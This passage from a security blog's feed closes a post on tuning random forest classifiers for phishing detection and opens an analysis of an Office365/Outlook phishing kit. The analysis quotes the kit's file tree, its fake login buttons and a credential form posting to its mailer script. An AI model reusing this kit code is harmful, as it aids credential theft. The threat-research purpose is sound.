    test_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))

&lt;span style=&#34;color:#75715e&#34;&gt;# let the magic happen&lt;/span&gt;
train_results,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,test_accuracies,train_accuracies)

&lt;span style=&#34;color:#75715e&#34;&gt;# store the averages of the classifiers for training and testing&lt;/span&gt;
avg_training&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(train_results)):

    &lt;span style=&#34;color:#75715e&#34;&gt;# average the results for every classifier&lt;/span&gt;
    avg_training&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(train_results[i]))
    avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[i]))

&lt;span style=&#34;color:#75715e&#34;&gt;# print chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_min_samples_splits, avg_training, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Train AUC&amp;#34;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_min_samples_splits, avg_testing, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC&amp;#34;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min samples splits&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/minsamplesplits.png&#34;
         alt=&#34;Performance of the model when tuning min_samples_split&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model when tuning min_samples_split&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;We can see from the results in the chart that for values of &lt;code&gt;min_samples_split&lt;/code&gt; above 0.7, our model does not learn enough information from the data: this is because too many samples are required at each node in order to be splitted. For high values of &lt;code&gt;min_samples_split&lt;/code&gt; the performances are equally bad (0.5 of AUC) during train and test.&lt;/p&gt;
&lt;h2 id=&#34;tuning-min_samples_leaf&#34;&gt;Tuning: min_samples_leaf&lt;/h2&gt;
&lt;p&gt;Similarly to the previous parameter, &lt;code&gt;min_samples_leaf&lt;/code&gt; it is used to specify the minimum number of samples which are required to be in a leaf of the trees in our forest. Again, this parameter can be an integer (also in this case its default value is 2) and a float, so that &lt;code&gt;ceil(min_samples_leaf * n_samples)&lt;/code&gt; are the minimum number of samples for each node.&lt;/p&gt;
&lt;p&gt;The classifiers which are defined in the following lines have &lt;code&gt;min_samples_split&lt;/code&gt; between 0.05 and 0.5 (maximum number allowed).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# min samples leaf from 5% to 50%&lt;/span&gt;
list_min_samples_leaf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.05&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to use in the magic function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; list_min_samples_leaf:

    &lt;span style=&#34;color:#75715e&#34;&gt;# create classifier with appropriate max_depth&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, min_samples_leaf&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)
    classifiers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(classifier)

    &lt;span style=&#34;color:#75715e&#34;&gt;# metrics to evaluate the classifier&lt;/span&gt;
    train_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))
    test_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))

&lt;span style=&#34;color:#75715e&#34;&gt;# let the magic happen&lt;/span&gt;
train_results,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,test_accuracies,train_accuracies)

&lt;span style=&#34;color:#75715e&#34;&gt;# store the averages of the classifiers for training and testing&lt;/span&gt;
avg_training&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(train_results)):

    &lt;span style=&#34;color:#75715e&#34;&gt;# average the results for every classifier&lt;/span&gt;
    avg_training&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(train_results[i]))
    avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[i]))

&lt;span style=&#34;color:#75715e&#34;&gt;# print chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_min_samples_leaf, avg_training, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Train AUC&amp;#34;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_min_samples_leaf, avg_testing, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC&amp;#34;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min samples leaf&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/minsamplesleaf.png&#34;
         alt=&#34;Performance of the model when tuning min_samples_leaf&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model when tuning min_samples_leaf&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The results are similar to the previous analysis. Increasing the value of &lt;code&gt;min_samples_leaf&lt;/code&gt; cause the model to fail in learning from the data, and decrease its performance to the point of obtaining AUC of 0.5 during train and test when &lt;code&gt;min_samples_leaf&lt;/code&gt; is set to more than 0.35.&lt;/p&gt;
&lt;h2 id=&#34;tuning-max_features&#34;&gt;Tuning: max_features&lt;/h2&gt;
&lt;p&gt;We will conclude this analysis of the random forest classifier with &lt;code&gt;max_features&lt;/code&gt;. This parameter represents the number of features which are going to be considered when looking for the best possible split.&lt;/p&gt;
&lt;p&gt;Its default value is &lt;em&gt;None&lt;/em&gt;, so that &lt;code&gt;max_features&lt;/code&gt; is set to the total number of features. Considering that our dataset has 10 features for every sample, we will train and test 10 classifiers having &lt;code&gt;max_features&lt;/code&gt; between 1 and 10.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# max features from 1 to 10&lt;/span&gt;
list_max_features &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to use in the magic function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; list_max_features:

    &lt;span style=&#34;color:#75715e&#34;&gt;# create classifier with appropriate max_depth&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, max_features&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)
    classifiers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(classifier)

    &lt;span style=&#34;color:#75715e&#34;&gt;# metrics to evaluate the classifier&lt;/span&gt;
    train_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))
    test_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))

&lt;span style=&#34;color:#75715e&#34;&gt;# let the magic happen&lt;/span&gt;
train_results,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,test_accuracies,train_accuracies)

&lt;span style=&#34;color:#75715e&#34;&gt;# store the averages of the classifiers for training and testing&lt;/span&gt;
avg_training&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(train_results)):

    &lt;span style=&#34;color:#75715e&#34;&gt;# average the results for every classifier&lt;/span&gt;
    avg_training&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(train_results[i]))
    avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[i]))

&lt;span style=&#34;color:#75715e&#34;&gt;# print chart&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_max_features, avg_training, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Train AUC&amp;#34;&lt;/span&gt;)
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_max_features, avg_testing, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC&amp;#34;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min samples leaf&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/maxfeatures.png&#34;
         alt=&#34;Performance of the model when tuning max_features&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model when tuning max_features&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The resulting chart shows that the accuracy of the model does not improve when increasing &lt;code&gt;max_features&lt;/code&gt; and it causes an overfitting for all the values in the experiment.&lt;/p&gt;
&lt;p&gt;A similar result was obtained when tuning the same parameter for the decision tree. As stated in the sklearn documentation of random forest classifiers: &lt;em&gt;&amp;lsquo;the search for a split does not stop until at least one valid partition of the node samples is found, even if it requires to effectively inspect more than max_features features&amp;rsquo;&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post we conducted an experiment to evaluate how some of the parameters available to tune random forest classifiers affect the performance of the model when trying to detect a phishing page. The parameters explored were: &lt;code&gt;criterion&lt;/code&gt;, &lt;code&gt;max_depth&lt;/code&gt;, &lt;code&gt;min_samples_split&lt;/code&gt;, &lt;code&gt;min_samples_leaf&lt;/code&gt; and &lt;code&gt;max_features&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I will mention again that this is not the proper way of tuning the parameters for a random forest: the best approach would be to extend parameters search using &lt;a href=&#34;https://scikit-learn.org/stable/modules/generated/sklearn.model_selection.RandomizedSearchCV.html&#34;&gt;RandomizedSearchCV&lt;/a&gt; provided by sklearn.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Phishing findings, campaign #1: u.zip (Office365/Outlook)</title>
      <link>/posts/phishing-findings-1/</link>
      <pubDate>Tue, 26 May 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/phishing-findings-1/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/sampei.jpeg&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;I started hunting and reporting phishing websites on Twitter: follow me &lt;a href=&#34;https://twitter.com/andpalmier&#34;&gt;here&lt;/a&gt; if you are interested!
In this series of posts I am going to analyze and discuss some of the phishing kits found online.&lt;/p&gt;
&lt;h2 id=&#34;lets-start-from-the-beginning&#34;&gt;Let&amp;rsquo;s start from the beginning&lt;/h2&gt;
&lt;p&gt;Here is my tweet containing some information about this instance of the kit:&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/hashtag/phishing?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#phishing&lt;/a&gt; &lt;a href=&#34;https://twitter.com/hashtag/onedrive?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#onedrive&lt;/a&gt;  &lt;br&gt;hxxps://www.bonatura.com/ok.co/u/&lt;br&gt;&lt;br&gt;exf: macdon161@gmail&lt;br&gt;reg: &lt;a href=&#34;https://twitter.com/GoDaddy?ref_src=twsrc%5Etfw&#34;&gt;@GoDaddy&lt;/a&gt; &lt;br&gt;🔐 &lt;a href=&#34;https://twitter.com/letsencrypt?ref_src=twsrc%5Etfw&#34;&gt;@letsencrypt&lt;/a&gt; &lt;br&gt;☣️ 63.249.146.86 (AS54489)&lt;br&gt;🎯 &lt;a href=&#34;https://twitter.com/onedrive?ref_src=twsrc%5Etfw&#34;&gt;@onedrive&lt;/a&gt; &lt;a href=&#34;https://twitter.com/Microsoft?ref_src=twsrc%5Etfw&#34;&gt;@Microsoft&lt;/a&gt; &lt;br&gt; &lt;a href=&#34;https://twitter.com/illegalFawn?ref_src=twsrc%5Etfw&#34;&gt;@illegalFawn&lt;/a&gt; &lt;a href=&#34;https://twitter.com/ActorExpose?ref_src=twsrc%5Etfw&#34;&gt;@ActorExpose&lt;/a&gt; &lt;a href=&#34;https://twitter.com/PhishKitTracker?ref_src=twsrc%5Etfw&#34;&gt;@PhishKitTracker&lt;/a&gt; &lt;a href=&#34;https://twitter.com/Spam404?ref_src=twsrc%5Etfw&#34;&gt;@Spam404&lt;/a&gt; &lt;a href=&#34;https://twitter.com/malwrhunterteam?ref_src=twsrc%5Etfw&#34;&gt;@malwrhunterteam&lt;/a&gt; &lt;a href=&#34;https://twitter.com/JAMESWT_MHT?ref_src=twsrc%5Etfw&#34;&gt;@JAMESWT_MHT&lt;/a&gt; &lt;a href=&#34;https://twitter.com/ANeilan?ref_src=twsrc%5Etfw&#34;&gt;@ANeilan&lt;/a&gt; &lt;a href=&#34;https://twitter.com/sysgoblin?ref_src=twsrc%5Etfw&#34;&gt;@sysgoblin&lt;/a&gt; &lt;a href=&#34;https://twitter.com/PhishStats?ref_src=twsrc%5Etfw&#34;&gt;@PhishStats&lt;/a&gt; &lt;a href=&#34;https://t.co/zbFwmBWEvm&#34;&gt;pic.twitter.com/zbFwmBWEvm&lt;/a&gt;&lt;/p&gt;&amp;mdash; Andrea Palmieri 🤌 (@andpalmier) &lt;a href=&#34;https://twitter.com/andpalmier/status/1263931978954485763?ref_src=twsrc%5Etfw&#34;&gt;May 22, 2020&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;We can clearly see from the second screenshot that the zip containing the phishing kit is left exposed, thus we can download it and check it on VirusTotal using the hash of the zip:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sha256sum u.zip
c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173  u.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/vtuzip.png&#34;
         alt=&#34;u.zip on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;a href=&#34;https://www.virustotal.com/gui/file/c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173/detection&#34;&gt;u.zip on VirusTotal&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;explore-the-kit&#34;&gt;Explore the kit&lt;/h2&gt;
&lt;p&gt;When extracting the archive, we can see the following structure:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;u
├── aol.php
├── css
│   ├── bootstrap.min.css
│   └── style.css
├── emailcode
│   └── email.php
├── images
│   ├── landing-devices-bg.jpg
│   ├── mail.png
│   ├── microbg.jpg
│   ├── microsoftlogo.png
│   ├── mobile-img.png
│   ├── officebg.jpg
│   ├── officelogo.png
│   ├── office.png
│   ├── Onedrive-logo.png
│   ├── outlook.png
│   └── webmaillogo.png
├── index.php
├── js
│   └── bootstrap.min.js
├── microsoft.php
├── office.php
├── outlookcode
│   └── email.php
└── webmail.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I usually start the analysis from the entrypoint: so, in this case, &lt;code&gt;index.php&lt;/code&gt;. If we look at the div having the class &lt;code&gt;loginform&lt;/code&gt;, we can find an interesting feature of this kit: it gives the user three options to login (Office365, Outlook and &amp;lsquo;other mail&amp;rsquo;).&lt;/p&gt;
&lt;p&gt;Here is how it looks in the code and in the browser:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loginform&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;office.php&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loginoffice&amp;#34;&lt;/span&gt;&amp;gt;Login with Office 365&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;microsoft.php&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loginoutlook&amp;#34;&lt;/span&gt;&amp;gt;Login with Outlook&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;webmail.php&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loginmail&amp;#34;&lt;/span&gt;&amp;gt;Login with Other Mail&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/indexphp.png&#34;
         alt=&#34;How this phishing kit looks like when deployed&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;How this phishing kit looks like when deployed&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;exfiltration-method&#34;&gt;Exfiltration method&lt;/h2&gt;
&lt;p&gt;The three PHP files referenced from &lt;code&gt;index.php&lt;/code&gt; all include &lt;code&gt;emailcode/email.php&lt;/code&gt; in the &lt;code&gt;action&lt;/code&gt; of the form containing input fields for the credentials. Here is the form in one of them, specifically &lt;code&gt;webmail.php&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;webmail&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;methed&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;emailcode/email.php&amp;#34;&lt;/span&gt;&amp;gt;
